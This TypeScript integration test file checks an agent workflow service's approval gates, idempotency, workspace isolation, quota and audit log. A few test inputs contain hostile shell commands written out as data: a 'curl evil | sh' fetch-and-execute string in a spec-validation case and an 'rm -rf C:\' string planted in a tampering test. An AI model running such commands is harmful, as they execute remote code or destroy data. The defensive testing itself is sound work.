import {
  ErrorResponse,
  MeResponse,
  RunInfo,
  WorkflowDetail,
  WorkflowListResponse,
  WorkflowVersionInfo,
  WorkspaceDetail,
  type WorkflowSpec,
} from "@agentflow/contracts";
import { and, eq, schema, sql, verifyAuditChain } from "@agentflow/db";
import { createMockExecutor, demoWorkflowSpecs, type StepExecutor } from "@agentflow/workflow";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { ledgerQuota } from "./quota";
import { get, ORIGIN, setup, signIn, type Harness } from "./test/harness";

interface User {
  cookie: string;
  userId: string;
  workspaceId: string;
  projectId: string;
  workflows: Record<string, string>;
}

let h: Harness;
let alice: User;
let bob: User;
let keyCounter = 0;
const newKey = () => `test-key-${++keyCounter}-${Math.random().toString(36).slice(2, 8)}`;

async function makeUser(harness: Harness, name: string): Promise<User> {
  const r = await signIn(harness, harness.google, {
    providerUserId: `g-${name}-${Math.random()}`,
    email: `${name}-${Math.random()}@example.com`,
    name,
  });
  const me = MeResponse.parse(await (await get(harness, "/v1/me", r.cookie)).json());
  const workspaceId = me.workspaces[0]!.id;
  const ws = WorkspaceDetail.parse(
    await (await get(harness, `/v1/workspaces/${workspaceId}`, r.cookie)).json(),
  );
  const list = WorkflowListResponse.parse(
    await (await get(harness, `/v1/workspaces/${workspaceId}/workflows`, r.cookie)).json(),
  );
  return {
    cookie: r.cookie!,
    userId: me.user.id,
    workspaceId,
    projectId: ws.projects[0]!.id,
    workflows: Object.fromEntries(list.workflows.map((w) => [w.key, w.id])),
  };
}

function send(
  harness: Harness,
  method: string,
  path: string,
  opts: { cookie?: string; body?: unknown; key?: string; origin?: string; raw?: string } = {},
) {
  const headers: Record<string, string> = {
    "content-type": "application/json",
    origin: opts.origin ?? ORIGIN,
  };
  if (opts.cookie) headers.cookie = opts.cookie;
  if (opts.key) headers["idempotency-key"] = opts.key;
  return harness.app.request(path, {
    method,
    headers,
    body: opts.raw ?? (opts.body === undefined ? undefined : JSON.stringify(opts.body)),
  });
}

const runsPath = (u: User) => `/v1/workspaces/${u.workspaceId}/runs`;

async function startRun(harness: Harness, u: User, workflowKey = "demo-documents", key = newKey()) {
  const res = await send(harness, "POST", runsPath(u), {
    cookie: u.cookie,
    key,
    body: { workflowId: u.workflows[workflowKey], input: { projectId: u.projectId } },
  });
  expect(res.status, await res.clone().text()).toBe(201);
  return RunInfo.parse(await res.json());
}

async function decide(harness: Harness, u: User, run: RunInfo, approvalId: string, body: unknown) {
  return send(harness, "POST", `${runsPath(u)}/${run.id}/approvals/${approvalId}`, {
    cookie: u.cookie,
    body,
  });
}

async function approve(harness: Harness, u: User, run: RunInfo, kind: "plan" | "action") {
  const a = run.approvals.find((x) => x.kind === kind && x.status === "pending")!;
  const res = await decide(harness, u, run, a.id, {
    decision: "approve",
    contentHash: a.contentHash,
  });
  expect(res.status, await res.clone().text()).toBe(200);
  return RunInfo.parse(await res.json());
}

async function errorCode(res: Response) {
  return ErrorResponse.parse(await res.json()).error.code;
}

async function runAudit(harness: Harness, runId: string) {
  const rows = await harness.handle.db
    .select()
    .from(schema.auditEvents)
    .orderBy(schema.auditEvents.seq);
  return rows.filter((r) => r.detail.runId === runId);
}

beforeAll(async () => {
  h = await setup();
  alice = await makeUser(h, "alice");
  bob = await makeUser(h, "bob");
});
afterAll(() => h.handle.close());

describe("workflow definitions and versions", () => {
  it("new workspaces get the three deterministic demo workflows", async () => {
    const list = WorkflowListResponse.parse(
      await (await get(h, `/v1/workspaces/${alice.workspaceId}/workflows`, alice.cookie)).json(),
    );
    expect(list.workflows.map((w) => [w.key, w.isDemo, w.latestVersion])).toEqual([
      ["demo-documents", true, 1],
      ["demo-email", true, 1],
      ["demo-repository", true, 1],
    ]);
  });

  const custom = (): WorkflowSpec => ({
    ...structuredClone(demoWorkflowSpecs()[0]!.spec),
    name: "Custom",
  });

  it("creates a validated workflow; rejects invalid specs with reasons", async () => {
    const path = `/v1/workspaces/${alice.workspaceId}/workflows`;
    const ok = await send(h, "POST", path, {
      cookie: alice.cookie,
      body: { key: "custom-docs", name: "Custom", spec: custom() },
    });
    expect(ok.status).toBe(201);
    expect(WorkflowDetail.parse(await ok.json()).versions).toHaveLength(1);

    const cyclic = custom();
    cyclic.steps[0]!.dependsOn = ["save"];
    const noApproval = custom();
    noApproval.steps[4]!.requiresApproval = false;
    const shell = custom() as unknown as { steps: { type: string }[] };
    shell.steps[1]!.type = "local.run_shell";
    const extra = Object.assign(custom(), { command: "curl evil | sh" });
    for (const [spec, needle] of [
      [cyclic, "cycle"],
      [noApproval, "approval"],
      [shell, "type"],
      [extra, "command"],
    ] as const) {
      const res = await send(h, "POST", path, {
        cookie: alice.cookie,
        body: { key: `bad-${Math.random().toString(36).slice(2, 8)}`, name: "x", spec },
      });
      expect(res.status).toBe(422);
      const body = ErrorResponse.parse(await res.json());
      expect(body.error.code).toBe("invalid_spec");
      expect(body.error.details!.join("\n")).toContain(needle);
    }

    const dup = await send(h, "POST", path, {
      cookie: alice.cookie,
      body: { key: "custom-docs", name: "Again", spec: custom() },
    });
    expect(dup.status).toBe(409);
  });

  it("versions are immutable and idempotent; identical spec does not create a new version", async () => {
    const path = `/v1/workspaces/${alice.workspaceId}/workflows`;
    const created = WorkflowDetail.parse(
      await (
        await send(h, "POST", path, {
          cookie: alice.cookie,
          body: { key: "versioned", name: "V", spec: custom() },
        })
      ).json(),
    );
    const v1 = created.versions[0]!;

    const same = await send(h, "POST", `${path}/${created.id}/versions`, {
      cookie: alice.cookie,
      body: { spec: custom() },
    });
    expect(same.status).toBe(200);
    expect(same.headers.get("idempotent-replayed")).toBe("true");
    expect(WorkflowVersionInfo.parse(await same.json()).version).toBe(1);

    const changed = custom();
    changed.description = "second";
    const v2 = await send(h, "POST", `${path}/${created.id}/versions`, {
      cookie: alice.cookie,
      body: { spec: changed },
    });
    expect(v2.status).toBe(201);
    expect(WorkflowVersionInfo.parse(await v2.json()).version).toBe(2);

    const detail = WorkflowDetail.parse(
      await (await get(h, `${path}/${created.id}`, alice.cookie)).json(),
    );
    expect(detail.versions.map((v) => v.version)).toEqual([2, 1]);
    expect(detail.versions[1]!.specHash).toBe(v1.specHash);

    const kindChange = { ...custom(), kind: "email" };
    const bad = await send(h, "POST", `${path}/${created.id}/versions`, {
      cookie: alice.cookie,
      body: { spec: kindChange },
    });
    expect(bad.status).toBe(422);
  });
});

describe("run lifecycle (deterministic mock workflow)", () => {
  it("plan approval → read-only steps → action approval → completed", async () => {
    let run = await startRun(h, alice);
    expect(run.status).toBe("awaiting_plan_approval");
    expect(run.steps.every((s) => s.status === "pending")).toBe(true);
    expect(run.approvals).toHaveLength(1);
    expect(run.approvals[0]).toMatchObject({ kind: "plan", status: "pending" });
    expect(JSON.parse(run.approvals[0]!.content).steps.map((s: { id: string }) => s.id)).toEqual([
      "read",
      "summarize",
      "extract",
      "preview",
      "save",
    ]);

    run = await approve(h, alice, run, "plan");
    expect(run.status).toBe("awaiting_action_approval");
    expect(run.steps.map((s) => [s.key, s.status])).toEqual([
      ["read", "succeeded"],
      ["summarize", "succeeded"],
      ["extract", "succeeded"],
      ["preview", "succeeded"],
      ["save", "awaiting_approval"],
    ]);
    const save = run.steps.find((s) => s.key === "save")!;
    expect(save.output).toBeNull();
    const action = run.approvals.find((a) => a.kind === "action")!;
    expect(action).toMatchObject({ stepKey: "save", status: "pending" });
    expect(action.content).toContain("Net 45");
    expect(action.destination).toMatch(/nothing is written/);

    run = await approve(h, alice, run, "action");
    expect(run.status).toBe("completed");
    expect(run.steps.every((s) => s.status === "succeeded")).toBe(true);
    expect(run.steps.find((s) => s.key === "save")!.output).toMatchObject({
      simulated: true,
      written: false,
    });

    const transitions = (await runAudit(h, run.id))
      .filter((e) => e.action === "run.transition")
      .map((e) => `${e.detail.from}->${e.detail.to}`);
    expect(transitions).toEqual([
      "draft->planned",
      "planned->awaiting_plan_approval",
      "awaiting_plan_approval->queued",
      "queued->running",
      "running->awaiting_action_approval",
      "awaiting_action_approval->running",
      "running->completed",
    ]);
    const [reservation] = await h.handle.db
      .select()
      .from(schema.quotaReservations)
      .where(eq(schema.quotaReservations.workspaceId, alice.workspaceId));
    expect(reservation!.status).toBe("settled");
  });

  it("is deterministic: same workflow and input give identical outputs and approval hashes", async () => {
    const a = await approve(h, alice, await startRun(h, alice, "demo-repository"), "plan");
    const b = await approve(h, alice, await startRun(h, alice, "demo-repository"), "plan");
    expect(a.steps.map((s) => s.outputHash)).toEqual(b.steps.map((s) => s.outputHash));
    expect(a.approvals.map((x) => x.contentHash)).toEqual(b.approvals.map((x) => x.contentHash));
  });

  it("all three demo workflows complete", async () => {
    for (const key of ["demo-documents", "demo-email", "demo-repository"]) {
      const done = await approve(
        h,
        alice,
        await approve(h, alice, await startRun(h, alice, key), "plan"),
        "action",
      );
      expect(done.status, key).toBe("completed");
    }
  });

  it("rejecting the plan cancels the run without executing any step and releases quota", async () => {
    const run = await startRun(h, alice);
    const res = await decide(h, alice, run, run.approvals[0]!.id, {
      decision: "reject",
      reason: "not now",
    });
    const after = RunInfo.parse(await res.json());
    expect(after).toMatchObject({ status: "cancelled", errorCode: "plan_rejected" });
    expect(after.steps.every((s) => s.status === "skipped" && s.output === null)).toBe(true);
    const [row] = await h.handle.db
      .select()
      .from(schema.workflowRuns)
      .where(eq(schema.workflowRuns.id, run.id));
    const [q] = await h.handle.db
      .select()
      .from(schema.quotaReservations)
      .where(eq(schema.quotaReservations.id, row!.quotaReservationId!));
    expect(q!.status).toBe("released");
  });

  it("rejecting the action never performs it", async () => {
    const run = await approve(h, alice, await startRun(h, alice), "plan");
    const action = run.approvals.find((a) => a.kind === "action")!;
    const after = RunInfo.parse(
      await (await decide(h, alice, run, action.id, { decision: "reject" })).json(),
    );
    expect(after).toMatchObject({ status: "cancelled", errorCode: "action_rejected" });
    expect(after.steps.find((s) => s.key === "save")).toMatchObject({
      status: "rejected",
      output: null,
    });
  });

  it("cancel works from any non-terminal state and is idempotent; terminal runs can't be cancelled", async () => {
    const run = await startRun(h, alice);
    const first = await send(h, "POST", `${runsPath(alice)}/${run.id}/cancel`, {
      cookie: alice.cookie,
    });
    expect(RunInfo.parse(await first.json()).status).toBe("cancelled");
    const again = await send(h, "POST", `${runsPath(alice)}/${run.id}/cancel`, {
      cookie: alice.cookie,
    });
    expect(again.status).toBe(200);
    expect(again.headers.get("idempotent-replayed")).toBe("true");

    const done = await approve(
      h,
      alice,
      await approve(h, alice, await startRun(h, alice), "plan"),
      "action",
    );
    const late = await send(h, "POST", `${runsPath(alice)}/${done.id}/cancel`, {
      cookie: alice.cookie,
    });
    expect(late.status).toBe(409);
    expect(await errorCode(late)).toBe("invalid_transition");
  });
});

describe("idempotency and duplicate requests", () => {
  it("requires a well-formed Idempotency-Key", async () => {
    const body = { workflowId: alice.workflows["demo-email"] };
    expect(
      await errorCode(await send(h, "POST", runsPath(alice), { cookie: alice.cookie, body })),
    ).toBe("idempotency_key_required");
    expect(
      await errorCode(
        await send(h, "POST", runsPath(alice), { cookie: alice.cookie, body, key: "short" }),
      ),
    ).toBe("idempotency_key_required");
  });

  it("same key + same body replays the same run; different body is refused", async () => {
    const key = newKey();
    const body = { workflowId: alice.workflows["demo-email"], input: {} };
    const first = await send(h, "POST", runsPath(alice), { cookie: alice.cookie, key, body });
    expect(first.status).toBe(201);
    const second = await send(h, "POST", runsPath(alice), { cookie: alice.cookie, key, body });
    expect(second.status).toBe(200);
    expect(second.headers.get("idempotent-replayed")).toBe("true");
    const a = RunInfo.parse(await first.json());
    expect(RunInfo.parse(await second.json()).id).toBe(a.id);

    const conflict = await send(h, "POST", runsPath(alice), {
      cookie: alice.cookie,
      key,
      body: { ...body, input: { note: "different" } },
    });
    expect(conflict.status).toBe(422);
    expect(await errorCode(conflict)).toBe("idempotency_key_reused");
    const rows = await h.handle.db
      .select()
      .from(schema.workflowRuns)
      .where(eq(schema.workflowRuns.idempotencyKey, key));
    expect(rows).toHaveLength(1);
  });

  it("concurrent duplicates create exactly one run and one quota reservation", async () => {
    const key = newKey();
    const body = { workflowId: alice.workflows["demo-documents"] };
    const results = await Promise.all(
      Array.from({ length: 5 }, () =>
        send(h, "POST", runsPath(alice), { cookie: alice.cookie, key, body }),
      ),
    );
    const ids = await Promise.all(results.map(async (r) => RunInfo.parse(await r.json()).id));
    expect(new Set(ids).size).toBe(1);
    expect(results.filter((r) => r.status === 201)).toHaveLength(1);
    const [run] = await h.handle.db
      .select()
      .from(schema.workflowRuns)
      .where(eq(schema.workflowRuns.idempotencyKey, key));
    const reservations = await h.handle.db
      .select()
      .from(schema.quotaReservations)
      .where(eq(schema.quotaReservations.id, run!.quotaReservationId!));
    expect(reservations).toHaveLength(1);
  });

  it("repeating an approval replays without re-executing steps; a conflicting decision is refused", async () => {
    const run = await startRun(h, alice);
    const plan = run.approvals[0]!;
    const body = { decision: "approve", contentHash: plan.contentHash };
    const [a, b] = await Promise.all([
      decide(h, alice, run, plan.id, body),
      decide(h, alice, run, plan.id, body),
    ]);
    expect([a.status, b.status]).toEqual([200, 200]);
    expect([a, b].filter((r) => r.headers.get("idempotent-replayed") === "true")).toHaveLength(1);
    const completed = (await runAudit(h, run.id)).filter((e) => e.action === "run.step_completed");
    expect(completed).toHaveLength(4);

    const flip = await decide(h, alice, run, plan.id, { decision: "reject" });
    expect(flip.status).toBe(409);
    expect(await errorCode(flip)).toBe("approval_already_decided");
  });
});

describe("approval cannot be bypassed", () => {
  it("wrong or missing content hash is refused and the run does not move", async () => {
    const run = await startRun(h, alice);
    const plan = run.approvals[0]!;
    const wrong = await decide(h, alice, run, plan.id, {
      decision: "approve",
      contentHash: "0".repeat(64),
    });
    expect(wrong.status).toBe(409);
    expect(await errorCode(wrong)).toBe("content_hash_mismatch");
    const missing = await decide(h, alice, run, plan.id, { decision: "approve" });
    expect(missing.status).toBe(422);
    const now = RunInfo.parse(
      await (await get(h, `${runsPath(alice)}/${run.id}`, alice.cookie)).json(),
    );
    expect(now.status).toBe("awaiting_plan_approval");
    expect(now.stateVersion).toBe(run.stateVersion);
  });

  it("there is no endpoint to set run/step/approval state directly", async () => {
    const run = await startRun(h, alice);
    const base = `${runsPath(alice)}/${run.id}`;
    const attempts: [string, string, unknown][] = [
      ["PATCH", base, { status: "completed" }],
      ["PUT", base, { status: "running" }],
      ["POST", `${base}/resume`, {}],
      ["POST", `${base}/advance`, {}],
      ["POST", `${base}/steps/save/complete`, {}],
      ["PATCH", `${base}/approvals/${run.approvals[0]!.id}`, { status: "approved" }],
      ["DELETE", `${base}/approvals/${run.approvals[0]!.id}`, undefined],
    ];
    for (const [method, path, body] of attempts) {
      const res = await send(h, method, path, { cookie: alice.cookie, body });
      expect(res.status, `${method} ${path}`).toBe(404);
    }
    const created = await send(h, "POST", runsPath(alice), {
      cookie: alice.cookie,
      key: newKey(),
      body: { workflowId: alice.workflows["demo-documents"], status: "completed" },
    });
    expect(created.status).toBe(422);
    const now = RunInfo.parse(await (await get(h, base, alice.cookie)).json());
    expect(now.status).toBe("awaiting_plan_approval");
  });

  it("the side-effecting step is never executed before its own approval", async () => {
    const run = await approve(h, alice, await startRun(h, alice), "plan");
    // Re-approving the plan does not touch the pending action.
    const plan = run.approvals.find((a) => a.kind === "plan")!;
    await decide(h, alice, run, plan.id, { decision: "approve", contentHash: plan.contentHash });
    const now = RunInfo.parse(
      await (await get(h, `${runsPath(alice)}/${run.id}`, alice.cookie)).json(),
    );
    expect(now.status).toBe("awaiting_action_approval");
    expect(now.steps.find((s) => s.key === "save")).toMatchObject({
      status: "awaiting_approval",
      output: null,
    });
  });

  it("an approval id can't be used through another run's path", async () => {
    const r1 = await startRun(h, alice);
    const r2 = await startRun(h, alice);
    const res = await decide(h, alice, r2, r1.approvals[0]!.id, {
      decision: "approve",
      contentHash: r1.approvals[0]!.contentHash,
    });
    expect(res.status).toBe(404);
  });

  it("content tampered in the database after the request is refused at decision time", async () => {
    const run = await approve(h, alice, await startRun(h, alice), "plan");
    const action = run.approvals.find((a) => a.kind === "action")!;
    const evil = "rm -rf C:\\";
    const { createHash } = await import("node:crypto");
    const evilHash = createHash("sha256").update(evil).digest("hex");
    await h.handle.db
      .update(schema.approvalRequests)
      .set({ content: evil, contentHash: evilHash })
      .where(eq(schema.approvalRequests.id, action.id));
    const res = await decide(h, alice, run, action.id, {
      decision: "approve",
      contentHash: evilHash,
    });
    expect(res.status).toBe(409);
    expect(await errorCode(res)).toBe("content_changed");
    const now = RunInfo.parse(
      await (await get(h, `${runsPath(alice)}/${run.id}`, alice.cookie)).json(),
    );
    expect(now.steps.find((s) => s.key === "save")!.output).toBeNull();
  });

  it("if the content to write changes after approval, the engine refuses the write", async () => {
    const mock = createMockExecutor();
    let proposals = 0;
    let performed = 0;
    const drifting: StepExecutor = {
      ...mock,
      // 1st call: approval request; 2nd: recheck at decision; 3rd: just before the write.
      proposeAction(step, ctx) {
        const p = mock.proposeAction(step, ctx);
        return ++proposals >= 3 ? { ...p, content: `${p.content}\nINJECTED` } : p;
      },
      performAction(step, ctx, proposal) {
        performed++;
        return mock.performAction(step, ctx, proposal);
      },
    };
    const dh = await setup({ executor: drifting });
    try {
      const u = await makeUser(dh, "drift");
      const run = await approve(
        dh,
        u,
        await approve(dh, u, await startRun(dh, u), "plan"),
        "action",
      );
      expect(run).toMatchObject({ status: "failed", errorCode: "approval_invalid" });
      expect(run.steps.find((s) => s.key === "save")).toMatchObject({
        status: "failed",
        output: null,
      });
      expect(performed).toBe(0);
    } finally {
      await dh.handle.close();
    }
  });

  it("a stored spec tampered to drop its approval gate is refused", async () => {
    const isolated = await setup();
    try {
      const u = await makeUser(isolated, "tamper");
      const [v] = await isolated.handle.db
        .select()
        .from(schema.workflowVersions)
        .where(eq(schema.workflowVersions.definitionId, u.workflows["demo-documents"]!));
      const spec = structuredClone(v!.spec);
      spec.steps.find((s) => s.type === "local.save_file")!.requiresApproval = false;
      await isolated.handle.db.execute(
        sql`alter table workflow_versions disable trigger workflow_versions_immutable`,
      );
      await isolated.handle.db
        .update(schema.workflowVersions)
        .set({ spec })
        .where(eq(schema.workflowVersions.id, v!.id));
      const res = await send(isolated, "POST", runsPath(u), {
        cookie: u.cookie,
        key: newKey(),
        body: { workflowId: u.workflows["demo-documents"] },
      });
      expect(res.status).toBe(409);
      expect(await errorCode(res)).toBe("invalid_workflow_version");
    } finally {
      await isolated.handle.close();
    }
  });
});

describe("authorization (B11)", () => {
  it("requires a session and same-origin writes", async () => {
    expect((await get(h, runsPath(alice))).status).toBe(401);
    expect((await get(h, `/v1/workspaces/${alice.workspaceId}/workflows`)).status).toBe(401);
    const cross = await send(h, "POST", runsPath(alice), {
      cookie: alice.cookie,
      key: newKey(),
      origin: "https://evil.example",
      body: { workflowId: alice.workflows["demo-email"] },
    });
    expect(cross.status).toBe(403);
  });

  it("another workspace's workflows, runs, approvals, and cancel are 404", async () => {
    const run = await startRun(h, alice);
    expect((await get(h, `/v1/workspaces/${alice.workspaceId}/workflows`, bob.cookie)).status).toBe(
      404,
    );
    expect(
      (
        await get(
          h,
          `/v1/workspaces/${alice.workspaceId}/workflows/${alice.workflows["demo-email"]}`,
          bob.cookie,
        )
      ).status,
    ).toBe(404);
    expect((await get(h, `${runsPath(alice)}/${run.id}`, bob.cookie)).status).toBe(404);
    expect((await get(h, runsPath(alice), bob.cookie)).status).toBe(404);
    const viaAlice = await send(
      h,
      "POST",
      `${runsPath(alice)}/${run.id}/approvals/${run.approvals[0]!.id}`,
      {
        cookie: bob.cookie,
        body: { decision: "approve", contentHash: run.approvals[0]!.contentHash },
      },
    );
    expect(viaAlice.status).toBe(404);
    // Bob's own workspace path with Alice's ids: still not found.
    const viaBob = await send(
      h,
      "POST",
      `${runsPath(bob)}/${run.id}/approvals/${run.approvals[0]!.id}`,
      {
        cookie: bob.cookie,
        body: { decision: "approve", contentHash: run.approvals[0]!.contentHash },
      },
    );
    expect(viaBob.status).toBe(404);
    expect(
      (await send(h, "POST", `${runsPath(bob)}/${run.id}/cancel`, { cookie: bob.cookie })).status,
    ).toBe(404);
    expect(
      (await send(h, "POST", `${runsPath(alice)}/${run.id}/cancel`, { cookie: bob.cookie })).status,
    ).toBe(404);
    const still = RunInfo.parse(
      await (await get(h, `${runsPath(alice)}/${run.id}`, alice.cookie)).json(),
    );
    expect(still.status).toBe("awaiting_plan_approval");
  });

  it("a run can't reference another workspace's workflow or project", async () => {
    const foreignWorkflow = await send(h, "POST", runsPath(bob), {
      cookie: bob.cookie,
      key: newKey(),
      body: { workflowId: alice.workflows["demo-email"] },
    });
    expect(foreignWorkflow.status).toBe(404);
    expect(await errorCode(foreignWorkflow)).toBe("workflow_not_found");
    const foreignProject = await send(h, "POST", runsPath(bob), {
      cookie: bob.cookie,
      key: newKey(),
      body: { workflowId: bob.workflows["demo-email"], input: { projectId: alice.projectId } },
    });
    expect(foreignProject.status).toBe(422);
    expect(await errorCode(foreignProject)).toBe("project_not_found");
  });

  it("malformed and unknown ids are 404, not 500", async () => {
    for (const id of ["nope", "00000000-0000-4000-8000-000000000000"]) {
      expect((await get(h, `${runsPath(alice)}/${id}`, alice.cookie)).status).toBe(404);
      expect(
        (await get(h, `/v1/workspaces/${alice.workspaceId}/workflows/${id}`, alice.cookie)).status,
      ).toBe(404);
    }
  });
});

describe("failures", () => {
  it("a failing step fails the run with a code only, skips the rest, and settles quota", async () => {
    const mock = createMockExecutor();
    const failing: StepExecutor = {
      ...mock,
      run(step, ctx) {
        if (step.id === "extract") throw new Error("SECRET-FILE-CONTENT leaked in error");
        return mock.run(step, ctx);
      },
    };
    const fh = await setup({ executor: failing });
    try {
      const u = await makeUser(fh, "failer");
      const run = await approve(fh, u, await startRun(fh, u), "plan");
      expect(run).toMatchObject({ status: "failed", errorCode: "step_failed:extract" });
      expect(run.steps.map((s) => [s.key, s.status])).toEqual([
        ["read", "succeeded"],
        ["summarize", "succeeded"],
        ["extract", "failed"],
        ["preview", "skipped"],
        ["save", "skipped"],
      ]);
      expect(JSON.stringify(run)).not.toContain("SECRET-FILE-CONTENT");
      const audit = await runAudit(fh, run.id);
      expect(JSON.stringify(audit)).not.toContain("SECRET-FILE-CONTENT");
      expect(audit.some((e) => e.action === "run.step_failed")).toBe(true);
      const [q] = await fh.handle.db
        .select()
        .from(schema.quotaReservations)
        .where(eq(schema.quotaReservations.workspaceId, u.workspaceId));
      expect(q).toMatchObject({ status: "settled", usage: { runs: 1, stepsSucceeded: 2 } });
    } finally {
      await fh.handle.close();
    }
  });

  it("quota hook can deny a run; nothing is created; releasing frees the slot", async () => {
    const qh = await setup({ quota: ledgerQuota({ monthlyRunLimit: 1 }) });
    try {
      const u = await makeUser(qh, "quota");
      const first = await startRun(qh, u);
      const denied = await send(qh, "POST", runsPath(u), {
        cookie: u.cookie,
        key: newKey(),
        body: { workflowId: u.workflows["demo-email"] },
      });
      expect(denied.status).toBe(429);
      expect(await errorCode(denied)).toBe("quota_exceeded");
      expect(
        await qh.handle.db
          .select()
          .from(schema.workflowRuns)
          .where(eq(schema.workflowRuns.workspaceId, u.workspaceId)),
      ).toHaveLength(1);
      await send(qh, "POST", `${runsPath(u)}/${first.id}/cancel`, { cookie: u.cookie });
      await startRun(qh, u, "demo-email");
    } finally {
      await qh.handle.close();
    }
  });

  it("rejects bad JSON and oversized bodies", async () => {
    const bad = await send(h, "POST", runsPath(alice), {
      cookie: alice.cookie,
      key: newKey(),
      raw: "{not json",
    });
    expect(bad.status).toBe(400);
    expect(await errorCode(bad)).toBe("invalid_json");
    const big = await send(h, "POST", runsPath(alice), {
      cookie: alice.cookie,
      key: newKey(),
      body: { workflowId: alice.workflows["demo-email"], input: { note: "x".repeat(70_000) } },
    });
    expect(big.status).toBe(413);
  });
});

describe("audit log", () => {
  it("chain verifies after all of the above and holds no approval content", async () => {
    const result = await verifyAuditChain(h.handle.db);
    expect(result.ok).toBe(true);
    const rows = await h.handle.db.select().from(schema.auditEvents);
    const text = JSON.stringify(rows.map((r) => r.detail));
    expect(text).not.toContain("Net 45");
    expect(text).not.toContain("diff --git");
  });

  it("run events are scoped to the run's workspace", async () => {
    const run = await startRun(h, bob);
    const events = await h.handle.db
      .select()
      .from(schema.auditEvents)
      .where(
        and(
          eq(schema.auditEvents.action, "run.created"),
          eq(schema.auditEvents.workspaceId, alice.workspaceId),
        ),
      );
    expect(events.some((e) => e.detail.runId === run.id)).toBe(false);
  });
});
